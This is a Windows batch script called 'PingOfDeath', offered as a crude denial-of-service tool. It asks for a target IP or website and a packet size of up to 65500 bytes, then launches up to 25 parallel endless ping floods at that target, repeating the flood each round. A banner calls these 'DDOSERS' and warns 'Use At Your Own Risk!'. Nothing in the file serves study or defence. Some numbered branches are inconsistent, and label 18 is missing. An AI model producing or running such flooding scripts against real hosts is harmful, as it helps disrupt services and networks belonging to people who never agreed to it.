@echo off
chcp 65001 >nul
color 5
mode con lines=25 cols=105
title PingOfDeath
:main
cls
echo.
echo  ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀▀█▄    ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄  
echo █   █   █ █   █  █  █  █ █ █ █         █      █ █  ▄▀  ▀▄ █ ▄▀   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █  ▐ █  █   ▄▀ 
echo ▐  █▀▀▀▀  ▐   █  ▐  ▐  █  ▀█ █    ▀▄▄  █      █ ▐ █▄▄▄▄   ▐ █    █   █▄▄▄▄▄    █▄▄▄█ ▐   █     ▐  █▄▄▄█  
echo    █          █       █   █  █     █ █ ▀▄    ▄▀  █    ▐     █    █   █    ▌   ▄▀   █    █         █   █  
echo  ▄▀        ▄▀▀▀▀▀▄  ▄▀   █   ▐▀▄▄▄▄▀ ▐   ▀▀▀▀    █         ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █   ▄▀   ▄▀         ▄▀  ▄▀  
echo █         █       █ █    ▐   ▐                  █         █     ▐   █    ▐   ▐   ▐   █          █   █    
echo ▐         ▐       ▐ ▐                           ▐         ▐         ▐                ▐          ▐   ▐    
echo.
echo                               _                        _			     _
echo                               1 NewPingOfDeath         2 OldPingOfDeath         3 Credits
echo.
set /p u=
if %u% == 1 goto e 
if %u% == 2 goto t 
if %u% == 3 goto f
:f
start programs\PingOfDeath\credits.txt
goto main
:e
set /P ws=IP:
:start
ping %ws% -l 65500
IF ERRORLEVEL 1 (pause & goto main)
goto start
:t
mode con lines=25 cols=105
cls
echo ========================================================================================================
echo  ▄▀▀▄▀▀▀▄  ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀▀█▄    ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄  
echo █   █   █ █   █  █  █  █ █ █ █         █      █ █  ▄▀  ▀▄ █ ▄▀   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █  ▐ █  █   ▄▀ 
echo ▐  █▀▀▀▀  ▐   █  ▐  ▐  █  ▀█ █    ▀▄▄  █      █ ▐ █▄▄▄▄   ▐ █    █   █▄▄▄▄▄    █▄▄▄█ ▐   █     ▐  █▄▄▄█  
echo    █          █       █   █  █     █ █ ▀▄    ▄▀  █    ▐     █    █   █    ▌   ▄▀   █    █         █   █  
echo  ▄▀        ▄▀▀▀▀▀▄  ▄▀   █   ▐▀▄▄▄▄▀ ▐   ▀▀▀▀    █         ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █   ▄▀   ▄▀         ▄▀  ▄▀  
echo █         █       █ █    ▐   ▐                  █         █     ▐   █    ▐   ▐   ▐   █          █   █    
echo ▐         ▐       ▐ ▐                           ▐         ▐         ▐                ▐          ▐   ▐                                 
echo ========================================================================================================
set /p D= IP/WEBSITE: 
:START
color 0e
cls
echo (Max Amount 65500)
echo.
set /p O= PACKET SIZE: 
 
color 0c
cls
echo ===============================================================================
echo =                          Use At Your Own Risk!                              =
echo ===============================================================================
echo (Max Amount 25) 
echo.
set /p S= HOW MAN DDOSERS: 
cls
goto %S%
pause 

:1
start ping %D% -t -l %O%
goto START
:2
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:3
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:4
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:5
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:6
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:7
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:8
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:9
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:10
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:11
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:12
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:13
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:14
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:15
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:16
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:17
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:19
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:20
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:21
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:22
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
 
:23
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
 
:24
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
 
:25
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
start ping %D% -t -l %O%
goto START
:END
goto main
echo
